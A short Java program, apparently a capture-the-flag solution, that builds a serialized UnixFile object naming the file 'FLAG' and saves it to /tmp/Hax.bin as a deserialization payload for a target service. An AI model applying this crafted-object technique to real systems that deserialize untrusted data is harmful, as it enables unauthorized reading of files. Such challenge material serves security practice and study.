import java.io.*;


abstract class OSFile implements Serializable {
  String file = "";
  abstract String getFileName();
}

class UnixFile extends OSFile {
  public String getFileName() {
    //Unix filenames are case-sensitive, don't change
    return file;
  }
}


public class Hax {

    public static void main(String[] args) {
	UnixFile f = new UnixFile();
      	f.file = "FLAG";
	try
	{
		FileOutputStream fileOut = new FileOutputStream("/tmp/Hax.bin");
         	ObjectOutputStream out = new ObjectOutputStream(fileOut);
         	out.writeObject(f);
         	out.close();
         	fileOut.close();
         	System.out.printf("Serialized data is saved in /tmp/Hax.bin\n");
       	}catch(IOException i)
      	{
          	i.printStackTrace();
      	}

    }

}
